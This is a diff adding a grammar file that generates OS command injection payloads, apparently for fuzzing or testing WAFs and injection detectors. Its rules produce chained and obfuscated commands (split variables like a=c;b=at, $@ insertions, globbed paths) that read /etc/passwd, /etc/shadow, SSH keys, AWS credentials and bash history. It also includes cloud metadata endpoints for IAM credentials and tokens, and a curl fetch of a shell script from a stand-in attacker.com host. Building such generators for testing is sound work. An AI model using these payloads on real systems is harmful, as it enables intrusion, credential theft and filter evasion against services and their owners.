@@ -1,0 +1,94 @@
+start : singleInjection | multiInjection | cloudMetadata | bashExpansion | subshellInjection;
+singleInjection : orIp commandContext | orIp opSem attriContext;
+multiInjection : orIp opSem middlecom opSem lastcom | orIp opSem dmiddlecom opSem dlastcom | orIp opSem smiddlecom opSem slastcom;
+bashExpansion : orIp opSem bashCommand;
+subshellInjection : orIp opSem dollarSubshell | orIp opSem backtickSubshell;
+cloudMetadata : cloudProvider metadataPath;
+
+//### Injection Context ###
+commandContext : pipeSymbol backCommand;
+attriContext : operator lt quote backCommand quote rt;
+middlecom : lssplit | pssplit | whoamisplit | routesplit | dirsplit | idsplit | pwdsplit | ifconfigsplit;
+lastcom : opDol chara opDol charb;
+dmiddlecom : smiddlecom space catalogsplit;
+dlastcom : opDol chara opDol charb space opDol charc opDol chard;
+smiddlecom : catsplit | tailsplit | sortsplit | tacsplit | headsplit | nlsplit;
+slastcom : opDol chara opDol charb space catalogvar;
+pipeSymbol : opSem | opDver | opSver | opDtie | opStie;
+backCommand : confusCom | unconfusCom;
+unconfusCom : 'ps' | 'echo' space echoArg | 'uname' space '-a' | 'id' | 'netstat' space '-an' | 'ls' space lsFlags | 'curl' space curlTarget | 'ifconfig' | 'pwd' | 'route' | 'whoami' | 'which' space binName | 'cat' space catalogvar | 'tail' space catalogvar | 'sort' space catalogvar | 'env' | 'printenv' | 'hostname' | 'uptime' | 'df' space '-h' | 'mount' | 'ss' space '-tulpn' | 'lsof' space '-i' | 'grep' space '-r' space terSQuote 'password' terSQuote space '/etc' | 'find' space '/' space '-name' space terSQuote '*.conf' terSQuote | 'awk' space terSQuote awkCmd terSQuote | 'sed' space terSQuote sedCmd terSQuote | 'cut' space '-d' space terSQuote ':' terSQuote space '-f1' | 'head' space '-n' space '10' | 'chmod' space '777' space '/tmp' | 'chown' space 'root' space '/tmp';
+confusCom : 'p' conSym 's' | 'ec' conSym 'ho' space echoArg | 'una' conSym 'me' space '-a' | 'i' conSym 'd' | 'net' conSym 'stat' space '-an' | 'l' conSym 's' space '-a' conSym 'l' | 'cu' conSym 'rl' space orIp | 'ifco' conSym 'nfig' | 'p' conSym 'wd' | 'ro' conSym 'ute' | 'wh' conSym 'oami' | 'whi' conSym 'ch' space 'my' conSym 'sql' | 'c' conSym 'at' space catalogvar | 'ta' conSym 'il' space catalogvar | 's' conSym 'ort' space catalogvar | 'e' conSym 'nv' | 'ho' conSym 'stname';
+echoArg : 'hello' | '$USER' | '$PATH' | '$HOME' | terSQuote 'pwned' terSQuote;
+lsFlags : '-al' | '-la' | '-lah' | '-R' | '-ltr';
+curlTarget : '127.0.0.1' | 'localhost' | 'http://attacker.com/shell.sh' | 'http://169.254.169.254/latest/meta-data/';
+binName : 'mysql' | 'python' | 'python3' | 'perl' | 'ruby' | 'nc' | 'netcat' | 'bash' | 'sh';
+awkCmd : '{print $1}' | '{print $2}' | 'NR==1';
+sedCmd : 's/old/new/g' | 's/root/admin/g' | 's/^/#/';
+
+//### Bash-specific Features ###
+bashCommand : bashGlob | bashBrace | bashHistory | bashAlias;
+bashGlob : 'cat' space '/etc/pa*' | 'cat' space '/etc/pass??' | 'cat' space '/etc/p[a-z]sswd';
+bashBrace : 'echo' space '{a,b,c}' | 'cat' space '/etc/{passwd,shadow,hosts}';
+bashHistory : 'cat' space '~/.bash_history' | 'cat' space '$HISTFILE';
+bashAlias : 'alias' space 'ls' opEqual terSQuote 'ls -la' terSQuote;
+
+//### Subshell Injection ###
+dollarSubshell : '$(' linuxCommand ')' | '$((' mathExpr '))';
+backtickSubshell : '`' linuxCommand '`';
+linuxCommand : 'whoami' | 'id' | 'pwd' | 'hostname' | 'uname -a' | 'cat /etc/passwd';
+mathExpr : '1+1' | '10*10' | '100-50';
+
+//### Cloud Metadata Endpoints ###
+cloudProvider : awsMetadata | gcpMetadata | azureMetadata | dockerMetadata | k8sMetadata;
+awsMetadata : 'http://169.254.169.254';
+gcpMetadata : 'http://metadata.google.internal' | 'http://metadata' | 'http://metadata.google.internal/computeMetadata/v1/';
+azureMetadata : 'http://169.254.169.254/metadata/instance?api-version=2021-02-01';
+dockerMetadata : 'http://localhost:2375/containers/json' | 'unix:///var/run/docker.sock';
+k8sMetadata : 'https://kubernetes.default.svc' | 'http://127.0.0.1:8001/api/v1/namespaces/default/pods';
+metadataPath : '/latest/meta-data/' | '/latest/user-data' | '/latest/meta-data/iam/security-credentials/' | '/computeMetadata/v1/instance/service-accounts/default/token' | '/metadata/identity/oauth2/token';
+lssplit : chara opEqual 'l' opSem charb opEqual 's';
+pssplit : chara opEqual 'p' opSem charb opEqual 's';
+catsplit : chara opEqual 'c' opSem charb opEqual 'at' | chara opEqual 'ca' opSem charb opEqual 't';
+tailsplit : chara opEqual 't' opSem charb opEqual 'ail' | chara opEqual 'ta' opSem charb opEqual 'il';
+sortsplit : chara opEqual 'sor' opSem charb opEqual 't' | chara opEqual 's' opSem charb opEqual 'ort';
+tacsplit : chara opEqual 'ta' opSem charb opEqual 'c' | chara opEqual 't' opSem charb opEqual 'ac';
+nlsplit : chara opEqual 'n' opSem charb opEqual 'l';
+headsplit : chara opEqual 'he' opSem charb opEqual 'ad' | chara opEqual 'hea' opSem charb opEqual 'd';
+whoamisplit : chara opEqual 'who' opSem charb opEqual 'ami' | chara opEqual 'wh' opSem charb opEqual 'oami';
+routesplit :  chara opEqual 'rou' opSem charb opEqual 'te' | chara opEqual 'r' opSem charb opEqual 'oute';
+dirsplit : chara opEqual 'd' opSem charb opEqual 'ir' | chara opEqual 'di' opSem charb opEqual 'r';
+idsplit : chara opEqual 'i' opSem charb opEqual 'd';
+pwdsplit : chara opEqual 'pw' opSem charb opEqual 'd' | chara opEqual 'p' opSem charb opEqual 'wd';
+ifconfigsplit : chara opEqual 'if' opSem charb opEqual 'config';
+catalogsplit : chara opEqual '/etc' opSem charb opEqual '/passwd' | chara opEqual '/et' opSem charb opEqual 'c/passwd';
+catalogvar : '/etc/passwd' | '/etc/pa' conSym 'sswd' | '/?t?/pa????' | '/etc/shadow' | '/etc/hosts' | '/proc/self/environ' | '/proc/self/cmdline' | '/var/log/apache2/access.log' | '/var/log/nginx/access.log' | '/home/user/.ssh/id_rsa' | '/root/.bash_history' | '/home/user/.aws/credentials';
+conSym : opDol opAt | opDol opStar | opDol terDigitLessTen | opDol lb terDigitMoreTen rb | opDol lb opHash rb | opDol lb terChar rb;
+
+//### Operators and constants###
+operator : '$' | '<' | '>' | 'system' | 'exec' | 'eval' | 'popen' | 'passthru' | 'shell_exec' | 'proc_open';
+space : ' ' | '+' | '%20';
+lt : '(' | '%28';
+rt : ')' | '%29';
+lb : '{';
+rb : '}';
+orIp : '' | '127.0.0.1' | 'localhost' | '0.0.0.0' | '1.1.1.1' | '8.8.8.8' | '8.8.4.4' | '192.168.1.1' | '10.0.0.1' | '172.16.0.1';
+quote : '"' | '\'' | '%22' | '%27';
+terSQuote : '\'';
+terDQuote : '"';
+terChar : 'a' | 'b' | 'c' | 'd' | 'e' | 'x' | 'y' | 'z';
+chara : 'a';
+charb : 'b';
+charc : 'c';
+chard : 'd';
+opSem : ';' | '%3B';
+opAt : '@';
+opStar : '*';
+opHash : '#';
+opDver : '||' | '%7C%7C';
+opEqual : '=' | '%3D';
+opSver : '|' | '%7C';
+opDtie : '&&' | '%26%26';
+opStie : '&' | '%26';
+opDol : '$';
+terDigitLessTen : '0' | '1' | '2' | '3' | '4' | '5' | '6' | '7' | '8' | '9';
+terDigitMoreTen : '10' | '11' | '12' | '13' | '14' | '15' | '16' | '17' | '18' | '19';
